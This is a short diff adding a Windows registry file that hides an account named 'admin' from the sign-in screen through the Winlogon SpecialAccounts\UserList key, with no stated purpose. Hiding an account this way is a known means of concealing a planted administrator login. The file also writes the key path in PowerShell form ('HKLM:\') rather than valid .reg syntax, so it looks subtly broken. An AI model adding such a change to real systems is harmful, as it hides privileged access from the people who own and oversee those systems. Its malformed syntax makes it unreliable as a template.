@@ -1,0 +1,4 @@
+Windows Registry Editor Version 5.00
+
+[HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
+"admin"=dword:00000000
